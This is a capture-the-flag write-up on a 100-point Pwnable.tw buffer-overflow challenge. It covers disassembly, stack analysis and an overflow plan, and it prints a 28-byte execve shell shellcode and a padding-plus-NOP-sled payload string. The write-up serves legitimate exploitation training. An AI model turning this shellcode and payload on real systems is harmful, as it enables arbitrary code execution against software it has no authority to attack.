---
name: Pwnable_Start
tools: [Pwnable, Binary Exploitation]
image: https://raw.githubusercontent.com/heckintosh/heckintosh.github.io/main/assets/images/pwnable.png
description:  A 100-point challenge from Pwnable.tw
---

<b>Link: </b><span style="color:#007bff">https://pwnable.tw/challenge/#1</span>

<b>Points</b>: 100

<b>Write-up by:</b><span style="color:#007bff"> https://github.com/heckintosh </span>

A typical buffer overflow attack with a little twist. For these first few challenges, I like to write in details so that I (and the readers) can remember the basic and fundamentals well.

## 1. Initial Analysis
First we get the type of the file.
```bash
$ file start                                   
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```
So it's a 32-bit Little-endian ELF. So pop the binary into your Linux machine to analyze. Remember to chmod the binary:
```bash
$ chmod +x ./start
```
Open the binary in pwndbg:
```bash
$ gdb -q ./start
pwndbg> checksec
[*] '/home/dan09/CTF/Pwnable/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found               // No memory protection in this binary.
    NX:       NX disabled
    PIE:      No PIE (0x8048000)      

pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end  
```

## 2. Assembly Analysis
```
pwndbg> start
pwndbg> disass
Dump of assembler code for function _start:
```
```nasm
0x08048060 <+0>:     push   esp                     // ESP is pushed to the stack
0x08048061 <+1>:     push   0x804809d               // Push the address of exit function
0x08048066 <+6>:     xor    eax,eax                 // Zero out the register
0x08048068 <+8>:     xor    ebx,ebx
0x0804806a <+10>:    xor    ecx,ecx
0x0804806c <+12>:    xor    edx,edx
0x0804806e <+14>:    push   0x3a465443              // PUSH CTF
0x08048073 <+19>:    push   0x20656874              // PUSH ('the ')
0x08048078 <+24>:    push   0x20747261              // PUSH ('art ')
0x0804807d <+29>:    push   0x74732073              // PUSH ('s st')
0x08048082 <+34>:    push   0x2774654c              // PUSH ("Let'")
0x08048087 <+39>:    mov    ecx,esp                 // Ecx contains the char pointer to the string one wants to print. In this case it is the ESP.
0x08048089 <+41>:    mov    dl,0x14                 // dl (edx) contains the size of the char array ones want to print. 0x14 = 20 bytes just enough for the string
0x0804808b <+43>:    mov    bl,0x1                  // bl (ebx) defines file descriptor. 1 means STDOUT
0x0804808d <+45>:    mov    al,0x4                  // al (eax) defines what type of syscall we want to make. 4 means write
0x0804808f <+47>:    int    0x80                    // 0x80 is a syscall. Same stuff below
0x08048091 <+49>:    xor    ebx,ebx                 // fd = 0 ==> STDIN
0x08048093 <+51>:    mov    dl,0x3c                 // Read up to 60 bytes from user input.
0x08048095 <+53>:    mov    al,0x3                  // 3 means read.
0x08048097 <+55>:    int    0x80                    // syscall, the missing ecx is taken from the above, which means user input will be written to the stack.
0x08048099 <+57>:    add    esp,0x14                // clean stack
0x0804809c <+60>:    ret 
```

Understand the code and you can move on to the next step.


## 3. Exploitation

#### Locating the buffer
In order to overflow the buffer, we have to know where it is. As you can see the syscall write has ecx denoting the start of the buffer. The size of the buffer is 20 bytes.

[Add image here]

Let's focus on these instructions, which is where you can give input:


```nasm
0x08048091 <+49>:    xor    ebx,ebx         // fd = 0 ==> STDIN
0x08048093 <+51>:    mov    dl,0x3c         // Read up to 60 bytes from user input.
0x08048095 <+53>:    mov    al,0x3          // 3 means read.
0x08048097 <+55>:    int    0x80            // syscall, the missing ecx is taken from the above, which means user input will be written to the stack.
```

So whatever you input will overwrite the stack defined by the instructions before. I inputed test and you can see what happens to the stack below. 

```
──────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ ecx esp 0xffffce04 ◂— 0x74736574 ('test')
01:0004│         0xffffce08 ◂— 0x7473200a ('\n st')
02:0008│         0xffffce0c ◂— 0x20747261 ('art ')
03:000c│         0xffffce10 ◂— 0x20656874 ('the ')
04:0010│         0xffffce14 ◂— 0x3a465443 ('CTF:')
05:0014│         0xffffce18 —▸ 0x804809d (_exit) ◂— pop    esp
06:0018│         0xffffce1c —▸ 0xffffce20 ◂— 0x1
07:001c│         0xffffce20 ◂— 0x1
```

The following instructions clean ups 20 bytes the stack, essentially leaves the ret at 0xffffce18 —▸ 0x804809d (_exit) ◂— pop    esp
```nasm
0x08048099 <+57>:    add    esp,0x14                // clean stack
0x0804809c <+60>:    ret 
```

So our mission is to overflow the 0xffffce18 address (the _exit function) and it will return to whatever address we want. We have a padding of 20 bytes and 4 bytes payload to overwrite the address.

#### Overwrite the return address
So what do we overwrite the return address with? The payload can't be simply AAAAAAAAAAAAAAAAAAAA + buffer address since it will just jump to a bunch of As. Maybe we can do something like this:

```
  AAAAA...AAAAAAA        +       shellcode address       +       nop sled  +      shellcode
────────────────────           ────────────────────
         ▼                              ▼
  20 As of padding                4bytes overflowing ret
```

Just search for shellcode on Google and get the 28 bytes one.
```
\x31\xc0\x50\x68\x2f\x2f\x73
\x68\x68\x2f\x62\x69\x6e\x89
\xe3\x89\xc1\x89\xc2\xb0\x0b
\xcd\x80\x31\xc0\x40\xcd\x80
```

Now we try to locate the address of the nop sled. 

```
AAAAAAAAAAAAAAAAAAAABBBB\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```